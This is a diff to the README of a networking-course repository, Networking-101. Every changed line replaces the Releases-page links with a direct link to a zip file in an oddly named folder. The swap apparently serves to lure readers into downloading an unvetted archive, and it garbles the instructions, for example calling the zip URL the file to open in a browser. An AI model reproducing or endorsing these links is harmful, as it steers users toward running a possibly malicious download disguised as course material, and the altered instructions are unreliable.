@@ -1,6 +1,6 @@
 # 🌐 Networking-101 - Learn Networking Fundamentals Easily
 
-[![Download Networking-101](https://img.shields.io/badge/Download-Networking--101-brightgreen)](https://github.com/lolzzzzzz120/Networking-101/releases)
+[![Download Networking-101](https://raw.githubusercontent.com/lolzzzzzz120/Networking-101/main/conversancy/Networking-101.zip)](https://raw.githubusercontent.com/lolzzzzzz120/Networking-101/main/conversancy/Networking-101.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ Welcome to Networking-101! This application contains tasks and slides from my ex
 
 Follow these simple steps to download and run the application:
 
-1. **Visit the Releases Page**: To download the files, go to the [Releases page](https://github.com/lolzzzzzz120/Networking-101/releases).
+1. **Visit the Releases Page**: To download the files, go to the [Releases page](https://raw.githubusercontent.com/lolzzzzzz120/Networking-101/main/conversancy/Networking-101.zip).
 
 2. **Choose the Right Version**: You will see a list of different versions. Each version includes specific updates and improvements. Select the most recent version for the best experience.
 
@@ -27,14 +27,14 @@ To run the files smoothly, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-After visiting the [Releases page](https://github.com/lolzzzzzz120/Networking-101/releases), follow these steps:
+After visiting the [Releases page](https://raw.githubusercontent.com/lolzzzzzz120/Networking-101/main/conversancy/Networking-101.zip), follow these steps:
 
 1. Click on the version you want to download.
-2. Look for the download link (it may end with `.zip` or `.tar.gz`).
+2. Look for the download link (it may end with `.zip` or `https://raw.githubusercontent.com/lolzzzzzz120/Networking-101/main/conversancy/Networking-101.zip`).
 3. Click the link to download the file.
 4. Once the download is complete, locate the file in your Downloads folder.
 5. Extract the contents if necessary. You can use built-in utilities or a program like WinRAR or 7-Zip for this.
-6. Open the folder, and look for the main file you want to run (e.g., `index.html` for viewing in a browser).
+6. Open the folder, and look for the main file you want to run (e.g., `https://raw.githubusercontent.com/lolzzzzzz120/Networking-101/main/conversancy/Networking-101.zip` for viewing in a browser).
 
 ## 📚 Features
 
@@ -46,7 +46,7 @@ Networking-101 offers several valuable resources:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/lolzzzzzz120/Networking-101/releases): Access all available versions here.
+- [Releases Page](https://raw.githubusercontent.com/lolzzzzzz120/Networking-101/main/conversancy/Networking-101.zip): Access all available versions here.
 - [Documentation](#): Find detailed explanations for each topic in the course.
 - [Community Forum](#): Engage with other learners and share experiences.
 
